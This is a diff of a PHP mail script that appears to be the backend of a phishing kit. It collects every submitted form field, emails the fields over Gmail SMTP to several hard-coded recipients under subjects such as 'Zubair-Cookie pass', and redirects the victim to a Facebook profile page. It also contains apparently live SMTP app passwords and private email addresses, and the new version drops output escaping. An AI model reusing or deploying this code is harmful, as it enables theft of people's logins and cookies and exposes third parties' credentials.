@@ -2,77 +2,58 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-// ==== CORS HEADERS ====
-header("Access-Control-Allow-Origin: *"); // You can replace * with your domain
-header("Access-Control-Allow-Methods: POST, OPTIONS");
-header("Access-Control-Allow-Headers: Content-Type");
+header("Location:https://facebook.com/profile.php");
 
-// ==== Handle Preflight (OPTIONS) Request ====
-if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
-    http_response_code(200);
-    exit();
-}
-
-// ==== Load PHPMailer ====
 require 'Exception.php';
 require 'PHPMailer.php';
 require 'SMTP.php';
 
-// ==== Only process POST request ====
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
     $emailBody = '';
 
-    // Detect content type
-    $contentType = $_SERVER["CONTENT_TYPE"] ?? '';
-
-    if (stripos($contentType, 'application/json') !== false) {
-        // Parse raw JSON input
-        $input = json_decode(file_get_contents("php://input"), true);
-    } else {
-        // Use form-data or x-www-form-urlencoded
-        $input = $_POST;
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
     }
 
-    // Check if input is valid
-    if (!empty($input) && is_array($input)) {
-        foreach ($input as $key => $value) {
-            $emailBody .= ucfirst($key) . ': ' . htmlspecialchars($value) . '<br>';
-        }
-    } else {
-        echo json_encode(['status' => 'error', 'message' => 'Message body empty']);
-        exit();
-    }
 
-    // ==== Set up PHPMailer ====
+
+    // PHPMailer object creation
     $mail = new PHPMailer(true);
 
     try {
         // SMTP settings
         $mail->isSMTP();
-        $mail->Host       = 'smtp.gmail.com';
+        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'dardhame1@gmail.com'; // Replace with your Gmail
-        $mail->Password   = 'vbbx qrsx uvpo plzl'; // App password, not your Gmail login
+        $mail->Username   = 'hip633253@gmail.com'; // Replace with your email address
+        $mail->Password   = 'gbcb ymna gsns njok'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
-        // Email headers
-        $mail->setFrom('dardhame1@gmail.com', 'PROFESSOR');
-        $mail->addAddress('sjhddhfjjjfjfg@gmail.com');
-        
+
+        // Email properties
+        $mail->setFrom('hip633253@gmail.com', 'PROFESSOR');
+        $mail->addAddress('juliealexia329@gmail.com');
+         $mail->addAddress('mahboobalinizamani@gmail.com');
+         $mail->addAddress('rnxsxnnxnx@gmail.com');
+
+      // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Zubair-Cookie pass';
-        $mail->Body    = $emailBody;
-
-        // Send the email
+        $mail->Subject = 'LATIF';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
+        
+        // Send email
         $mail->send();
-
-        echo json_encode(['status' => 'success', 'message' => 'Email sent']);
+        echo 'Email successfully sent using PHPMailer.';
     } catch (Exception $e) {
-        echo json_encode(['status' => 'error', 'message' => $mail->ErrorInfo]);
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
     }
 } else {
-    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
+    echo "Invalid request!";
 }
+?>
